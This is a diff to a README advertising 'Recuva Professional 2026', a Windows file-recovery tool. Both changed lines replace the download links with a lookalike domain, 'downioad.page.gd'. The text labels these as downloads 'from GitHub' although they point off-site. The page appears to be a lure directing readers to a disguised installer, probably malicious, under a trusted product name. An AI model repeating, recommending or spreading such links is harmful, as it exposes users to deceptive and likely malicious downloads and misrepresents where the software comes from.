@@ -2,7 +2,7 @@
 
 Recuva Professional 2026 is an advanced data recovery solution tailored for Windows desktops. This tool provides comprehensive features to restore lost or deleted files from a wide range of storage media, ensuring data safety and efficiency.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -54,6 +54,6 @@ The tool is designed to minimize this risk, but it's recommended to save recover
 
 For the most recent version, please use the link below. Ensure you download only from trusted sources to avoid security issues.
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 *Last Updated: 2026*
